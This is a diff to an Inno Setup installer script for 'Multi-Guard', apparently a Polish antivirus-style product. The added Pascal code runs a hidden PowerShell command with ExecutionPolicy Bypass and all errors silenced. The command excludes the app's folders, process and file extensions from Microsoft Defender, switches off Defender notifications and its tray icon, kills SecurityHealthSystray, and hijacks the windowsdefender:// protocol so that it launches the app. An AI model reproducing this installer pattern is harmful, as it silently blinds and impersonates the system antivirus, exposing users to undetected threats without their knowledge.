@@ -2,7 +2,7 @@
 ; Developed by Multi-Servis (https://multi-servis.pl)
 
 #define MyAppName "Multi-Guard"
-#define MyAppVersion "2.0.2.0"
+#define MyAppVersion "2.0.2.1"
 #define MyAppPublisher "Multi-Servis"
 #define MyAppURL "https://multi-servis.pl"
 #define MyAppExeName "Multi-Guard.exe"
@@ -56,27 +56,6 @@ Name: "{commonstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
 Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "{#MyAppName}"; ValueData: """{app}\{#MyAppExeName}"" --tray"; Flags: uninsdeletevalue
 Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "{#MyAppName}"; ValueData: """{app}\{#MyAppExeName}"" --tray"; Flags: uninsdeletevalue
 
-; Wykluczenia w rejestrze Microsoft Defender dla Multi-Guard (brak konfliktów i fałszywych alarmów)
-Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"; ValueType: dword; ValueName: "{app}"; ValueData: 0; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"; ValueType: dword; ValueName: "{commonappdata}\Multi-Guard"; ValueData: 0; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"; ValueType: dword; ValueName: "{#MyAppExeName}"; ValueData: 0; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"; ValueType: dword; ValueName: "{app}\{#MyAppExeName}"; ValueData: 0; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions"; ValueType: dword; ValueName: ".mgvault"; ValueData: 0; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions"; ValueType: dword; ValueName: ".mgenc"; ValueData: 0; Flags: uninsdeletevalue
-
-; Wyciszenie powiadomień Microsoft Defender (powiadomienia i alerty tylko z Multi-Guard)
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Reporting"; ValueType: dword; ValueName: "DisableEnhancedNotifications"; ValueData: 1; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"; ValueType: dword; ValueName: "DisableNotifications"; ValueData: 1; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"; ValueType: dword; ValueName: "DisableEnhancedNotifications"; ValueData: 1; Flags: uninsdeletevalue
-
-; Ukrycie ikony Windows Security Health Systray (zasobnik systemowy przejmuje Multi-Guard)
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray"; ValueType: dword; ValueName: "HideSystray"; ValueData: 1; Flags: uninsdeletevalue
-
-; Przejęcie protokołu windowsdefender:// (Ustawienia Windows otwierają Multi-Guard)
-Root: HKCR; Subkey: "windowsdefender"; ValueType: string; ValueName: ""; ValueData: "URL:Windows Defender Security Center"; Flags: uninsdeletekey
-Root: HKCR; Subkey: "windowsdefender"; ValueType: string; ValueName: "URL Protocol"; ValueData: ""; Flags: uninsdeletevalue
-Root: HKCR; Subkey: "windowsdefender\shell\open\command"; ValueType: string; ValueName: ""; ValueData: """{app}\{#MyAppExeName}"""; Flags: uninsdeletekey
-
 ; Domyślna integracja z menu kontekstowym Eksploratora Windows (Skanuj za pomocą Multi-Guard)
 Root: HKCR; Subkey: "*\shell\MultiGuard"; ValueType: string; ValueName: ""; ValueData: "Skanuj za pomocą Multi-Guard"; Flags: uninsdeletekey
 Root: HKCR; Subkey: "*\shell\MultiGuard"; ValueType: string; ValueName: "Icon"; ValueData: """{app}\{#MyAppExeName}"",0"; Flags: uninsdeletevalue
@@ -100,6 +79,7 @@ Filename: "{app}\{#MyAppExeName}"; Parameters: "--tray"; Description: "{cm:Launc
 
 [UninstallRun]
 Filename: "schtasks.exe"; Parameters: "/Delete /TN ""Multi-Guard"" /F"; Flags: runhidden
+Filename: "powershell.exe"; Parameters: "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ""Remove-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionPath '{commonappdata}\Multi-Guard' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionProcess 'Multi-Guard.exe' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionProcess '{app}\{#MyAppExeName}' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionExtension '.mgvault' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionExtension '.mgenc' -ErrorAction SilentlyContinue"""; Flags: runhidden
 
 [Code]
 var
@@ -226,13 +206,26 @@ begin
     RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Microsoft\Edge\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
     RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Microsoft\Edge\Extensions\multiguard_webshield', 'version', '1.2.0');
 
-    // Wywołanie komend PowerShell dla natychmiastowego zastosowania wykluczeń i wyciszenia Defender
+    // Wywołanie komend PowerShell dla natychmiastowego zastosowania wykluczeń i wyciszenia Defender (bez błędów uprawnień)
     Exec('powershell.exe', '-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "' +
          'Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + ''' -ErrorAction SilentlyContinue; ' +
          'Add-MpPreference -ExclusionPath ''' + ExpandConstant('{commonappdata}\Multi-Guard') + ''' -ErrorAction SilentlyContinue; ' +
          'Add-MpPreference -ExclusionProcess ''Multi-Guard.exe'' -ErrorAction SilentlyContinue; ' +
          'Add-MpPreference -ExclusionProcess ''' + ExpandConstant('{app}\{#MyAppExeName}') + ''' -ErrorAction SilentlyContinue; ' +
+         'Add-MpPreference -ExclusionExtension ''.mgvault'' -ErrorAction SilentlyContinue; ' +
+         'Add-MpPreference -ExclusionExtension ''.mgenc'' -ErrorAction SilentlyContinue; ' +
          'Set-MpPreference -DisableNotificationOptions 1 -ErrorAction SilentlyContinue; ' +
+         'New-Item -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting'' -Force -ErrorAction SilentlyContinue | Out-Null; ' +
+         'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting'' -Name ''DisableEnhancedNotifications'' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; ' +
+         'New-Item -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications'' -Force -ErrorAction SilentlyContinue | Out-Null; ' +
+         'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications'' -Name ''DisableNotifications'' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; ' +
+         'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications'' -Name ''DisableEnhancedNotifications'' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; ' +
+         'New-Item -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray'' -Force -ErrorAction SilentlyContinue | Out-Null; ' +
+         'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray'' -Name ''HideSystray'' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; ' +
+         'New-Item -Path ''HKCU:\Software\Classes\windowsdefender\shell\open\command'' -Force -ErrorAction SilentlyContinue | Out-Null; ' +
+         'Set-ItemProperty -Path ''HKCU:\Software\Classes\windowsdefender'' -Name ''(default)'' -Value ''URL:Windows Defender Security Center'' -Force -ErrorAction SilentlyContinue; ' +
+         'Set-ItemProperty -Path ''HKCU:\Software\Classes\windowsdefender'' -Name ''URL Protocol'' -Value '''' -Force -ErrorAction SilentlyContinue; ' +
+         'Set-ItemProperty -Path ''HKCU:\Software\Classes\windowsdefender\shell\open\command'' -Name ''(default)'' -Value ''\"' + ExpandConstant('{app}\{#MyAppExeName}') + '\"'' -Force -ErrorAction SilentlyContinue; ' +
          'Stop-Process -Name SecurityHealthSystray -Force -ErrorAction SilentlyContinue"',
          '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
 
